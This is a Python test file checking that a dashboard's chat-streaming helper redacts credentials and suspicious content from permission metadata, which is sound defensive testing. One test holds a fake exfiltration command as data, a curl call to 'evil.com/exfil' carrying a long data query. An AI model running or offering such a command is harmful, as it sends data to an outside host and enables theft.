"""Test that permission meta is redacted before streaming to dashboard."""

import json

from kiro_crew.dashboard.chat import _build_stream_chunk, _redact_deep


def _build_streaming_chunk(msg: dict) -> dict:
    """Call the actual production helper and parse the JSON result."""
    return json.loads(_build_stream_chunk(msg))


class TestStreamingMetaRedaction:
    def test_credential_in_tool_input_is_redacted(self):
        """tool_input containing AWS credentials should be redacted."""
        meta_json = json.dumps({
            "request_id": "req-123",
            "tool_input": "aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE",
            "is_read_only": "1",
        })
        msg = {"role": "permission", "content": "shell", "cls": meta_json, "ts": "t1"}
        chunk = _build_streaming_chunk(msg)

        assert "meta" in chunk
        assert "AKIAIOSFODNN7EXAMPLE" not in chunk["meta"]["tool_input"]

    def test_exfiltration_url_in_tool_input_is_redacted(self):
        """tool_input containing exfiltration URL with long query is redacted."""
        long_query = "x" * 250
        meta_json = json.dumps({
            "request_id": "req-456",
            "tool_input": f"curl https://evil.com/exfil?data={long_query}",
        })
        msg = {"role": "permission", "content": "shell", "cls": meta_json, "ts": "t1"}
        chunk = _build_streaming_chunk(msg)

        assert "meta" in chunk
        assert long_query not in chunk["meta"]["tool_input"]

    def test_non_string_meta_values_preserved(self):
        """Non-string values (bool, int) should pass through without stringification."""
        meta_json = json.dumps({
            "request_id": "req-789",
            "tool_input": "ls /tmp",
            "is_read_only": True,
            "retry_count": 3,
        })
        msg = {"role": "permission", "content": "shell", "cls": meta_json, "ts": "t1"}
        chunk = _build_streaming_chunk(msg)

        assert chunk["meta"]["is_read_only"] is True
        assert chunk["meta"]["retry_count"] == 3
        assert chunk["meta"]["approval_id"] == "req-789"

    def test_non_permission_messages_have_no_meta(self):
        """Only permission messages should include meta."""
        msg = {"role": "tool", "content": "done", "cls": "", "ts": "t1"}
        chunk = _build_streaming_chunk(msg)

        assert "meta" not in chunk

    def test_nested_structure_credentials_redacted(self):
        """Credentials in nested structures should be redacted."""
        nested = {"params": {"secret": "AKIAIOSFODNN7EXAMPLE"}, "tags": ["safe", "AKIAIOSFODNN7EXAMPLE"]}
        result = _redact_deep(nested)

        assert "AKIAIOSFODNN7EXAMPLE" not in result["params"]["secret"]
        assert "AKIAIOSFODNN7EXAMPLE" not in result["tags"][1]
        assert result["tags"][0] == "safe"
